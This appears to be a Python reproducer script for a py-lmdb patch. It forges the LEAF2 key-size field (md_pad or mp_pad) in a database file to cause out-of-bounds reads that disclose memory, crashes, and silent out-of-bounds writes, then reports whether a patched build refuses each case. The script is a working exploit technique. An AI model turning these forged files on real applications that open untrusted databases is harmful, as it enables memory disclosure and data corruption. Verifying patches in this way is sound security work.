#!/usr/bin/env python
#
# Reproducer for the unvalidated LEAF2 key size (md_pad / mp_pad).
#
# Run against an unpatched py-lmdb build to see the failures; against a
# build carrying lib*/py-lmdb/validate-md-pad.patch every case is refused
# with an lmdb.Error instead.
#
#   LMDB_PURE=1 python setup.py build_ext --inplace   # unpatched
#   python misc/md_pad_repro.py --engine 0
#   python misc/md_pad_repro.py --engine 1
#
# md_pad is the fixed key size of an MDB_DUPFIXED (LEAF2) database.  The
# patch series already bounds a *page's* mp_pad in mdb_page_get
# (validate-leaf2-keysize), but every LEAF2 computation uses the size held
# in the *DB record*, and nothing required the two to agree.  Of the four
# places an MDB_db is loaded from disk, three ran BAD_DB_FLAGS, which
# checks only md_flags; mdb_xcursor_init1's memcpy for an F_SUBDATA node
# was unchecked entirely.
#
# Only that one field is forged below, so every page in the file stays
# internally consistent and the existing page-level validation still
# passes.  Three consequences, all with the file otherwise intact:
#
#   read      md_pad becomes the length of the buffer handed back, so a
#             small record reads far past its page -- silently, with no
#             error, disclosing adjacent mapping contents.
#   getmulti  mv_size = NUMKEYS(page) * md_pad, computed in 32-bit
#             arithmetic.
#   write     the LEAF2 branch of mdb_node_add uses md_pad as a
#             memmove()/memcpy() length, so the same forged value is an
#             out-of-bounds *write* inside the writable mapping.  Modest
#             values corrupt the file and commit silently.
#
# A fourth case covers the sub-page variant: for a small number of
# duplicates LMDB keeps them in a sub-page embedded in the node rather
# than a real sub-DB, and mdb_xcursor_init1 takes the key size from that
# sub-page's mp_pad.  Sub-pages never pass through mdb_page_get, so
# validate-leaf2-keysize never saw them.
#

from __future__ import print_function

import argparse
import os
import shutil
import struct
import subprocess
import sys
import tempfile

import lmdb

MDB_MAGIC = 0xBEEFC0DE
P_LEAF = 0x02
P_LEAF2 = 0x20
F_SUBDATA = 0x02
F_DUPDATA = 0x04


def even(n):
    return (n + 1) & ~1


class Layout(object):
    """Page/meta geometry of a data.mdb, detected rather than assumed.

    0.9 and 1.0 differ in three ways that matter here: the page header is
    16 vs 24 bytes, PAGEBASE is 0 vs PAGEHDRSZ, and 1.0 aligns node data
    to an even offset (NODEDATA uses EVEN(mn_ksize)).
    """

    def __init__(self, raw):
        self.hdrsz = None
        for off in range(0, 64, 4):
            if struct.unpack_from('=I', raw, off)[0] == MDB_MAGIC:
                self.hdrsz = off
                break
        assert self.hdrsz is not None, 'could not locate MDB_MAGIC'
        # 1.0 gained mp_txnid in the page header and turned on PAGEBASE.
        self.v10 = self.hdrsz >= 24
        self.pagebase = self.hdrsz if self.v10 else 0
        self.psize = struct.unpack_from('<I', raw, self.hdrsz + 24)[0]

    @property
    def mp_pad(self):
        """Offset of mp_pad within a page: pgno(8) [txnid(8)] pad(2)."""
        return self.hdrsz - 8

    @property
    def mp_flags(self):
        return self.hdrsz - 6

    @property
    def mp_lower(self):
        return self.hdrsz - 4

    def nodedata(self, node_off, ksize):
        ksize = even(ksize) if self.v10 else ksize
        return node_off + 8 + ksize


def find_dup_node(raw, lay, want_subdata):
    """Locate a leaf node holding duplicate data.

    Returns (node_off, data_off) for the first F_DUPDATA node whose
    F_SUBDATA state matches want_subdata: a real sub-DB (an MDB_db record)
    or an embedded sub-page.
    """
    for off in range(lay.psize * 2, len(raw), lay.psize):
        flags = struct.unpack_from('<H', raw, off + lay.mp_flags)[0]
        if not (flags & P_LEAF) or (flags & P_LEAF2):
            continue
        lower = struct.unpack_from('<H', raw, off + lay.mp_lower)[0]
        nkeys = (lower - (lay.hdrsz - lay.pagebase)) >> 1
        for idx in range(nkeys):
            ptr = struct.unpack_from('<H', raw, off + lay.hdrsz + idx * 2)[0]
            if ptr == 0 or ptr >= lay.psize:
                continue
            node_off = off + ptr + lay.pagebase
            mn_flags = struct.unpack_from('<H', raw, node_off + 4)[0]
            if not (mn_flags & F_DUPDATA):
                continue
            if bool(mn_flags & F_SUBDATA) != want_subdata:
                continue
            ksize = struct.unpack_from('<H', raw, node_off + 6)[0]
            return node_off, lay.nodedata(node_off, ksize)
    return None, None


def build(path, engine, ndups):
    env = lmdb.open(path, max_dbs=4, map_size=64 << 20, lib_version=engine)
    db = env.open_db(b'dfdb', dupsort=True, dupfixed=True)
    with env.begin(write=True, db=db) as txn:
        for i in range(ndups):
            txn.put(b'key0', b'v%06d' % i)
    env.close()


def forge(path, engine, ndups, want_subdata, new_pad):
    """Create a DB, then rewrite only the LEAF2 key size.  Returns the
    genuine value so the caller can compare."""
    build(path, engine, ndups)
    db_path = os.path.join(path, 'data.mdb')
    with open(db_path, 'rb') as fp:
        raw = bytearray(fp.read())

    lay = Layout(raw)
    node_off, data_off = find_dup_node(raw, lay, want_subdata)
    assert node_off is not None, (
        'no %s node found' % ('sub-DB' if want_subdata else 'sub-page'))

    if want_subdata:
        # md_pad is the first field of the MDB_db record.
        where, fmt = data_off, '<I'
    else:
        # mp_pad within the embedded sub-page.
        where, fmt = data_off + lay.mp_pad, '<H'

    real = struct.unpack_from(fmt, raw, where)[0]
    struct.pack_into(fmt, raw, where, new_pad)
    with open(db_path, 'wb') as fp:
        fp.write(raw)
    return lay, real


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('--engine', type=int, default=0, choices=(0, 1),
                    help='bundled LMDB major version to build the file with')
    ap.add_argument('--case', type=int, default=None,
                    help=argparse.SUPPRESS)   # internal: run one case
    args = ap.parse_args()
    eng = args.engine

    def run(want_subdata, ndups, pad, action):
        path = tempfile.mkdtemp(prefix='mdpad')
        try:
            lay, real = forge(path, eng, ndups, want_subdata, pad)
            print('    genuine key size %d, forged to %d (psize %d)'
                  % (real, pad, lay.psize))
            env = lmdb.open(path, max_dbs=4, lib_version=eng)
            try:
                db = env.open_db(b'dfdb', dupsort=True, dupfixed=True)
                action(env, db, real)
            finally:
                env.close()
        finally:
            shutil.rmtree(path, ignore_errors=True)

    def read(env, db, real):
        with env.begin(db=db) as txn:
            cur = txn.cursor()
            cur.set_key(b'key0')
            val = bytes(cur.value())
            leaked = sum(1 for b in bytearray(val[real:]) if b)
            print('    LEAKED: value() returned %d bytes for a %d-byte '
                  'record, %d non-zero bytes past its end'
                  % (len(val), real, leaked))

    def getmulti(env, db, real):
        with env.begin(db=db) as txn:
            cur = txn.cursor()
            cur.set_key(b'key0')
            items = cur.getmulti((b'key0',), dupdata=True)
            print('    getmulti returned %d items' % len(items))

    def write(env, db, real):
        with env.begin(write=True, db=db) as txn:
            txn.put(b'key0', b'ZZZZZZZ')
        print('    WROTE: out-of-bounds write committed silently')

    cases = [
        ('sub-DB md_pad, read path (disclosure)',
         lambda: run(True, 4000, 0x8000, read)),
        ('sub-DB md_pad, read path (crash)',
         lambda: run(True, 4000, 0xFFFFFFFF, read)),
        ('sub-DB md_pad, getmulti path',
         lambda: run(True, 4000, 0xFFFFFFFF, getmulti)),
        ('sub-DB md_pad, write path (mdb_node_add)',
         lambda: run(True, 4000, 0x1000, write)),
        ('sub-page mp_pad, read path',
         lambda: run(False, 4, 0x4000, read)),
    ]

    # Child mode: run one case in this process and let it crash if it will.
    if args.case is not None:
        try:
            cases[args.case][1]()
        except lmdb.Error as e:
            print('    REFUSED: %s: %s' % (type(e).__name__, e))
            return 0
        return 1

    # Parent mode: each case in its own process, so a crash in one does not
    # hide the others and the killing signal is visible.
    print('engine: LMDB %d.x' % eng)
    bad = 0
    for i, (name, _) in enumerate(cases):
        print('--- %s' % name)
        sys.stdout.flush()
        rv = subprocess.call([sys.executable, os.path.abspath(__file__),
                              '--engine', str(eng), '--case', str(i)])
        if rv == 0:
            continue
        bad += 1
        if rv < 0:
            print('    CRASHED: killed by signal %d' % -rv)
        else:
            print('    NOT REFUSED (exit %d)' % rv)

    print()
    print('ALL CASES REFUSED' if not bad else
          'VULNERABLE: %d of %d cases not refused' % (bad, len(cases)))
    return 0 if not bad else 1


if __name__ == '__main__':
    sys.exit(main())
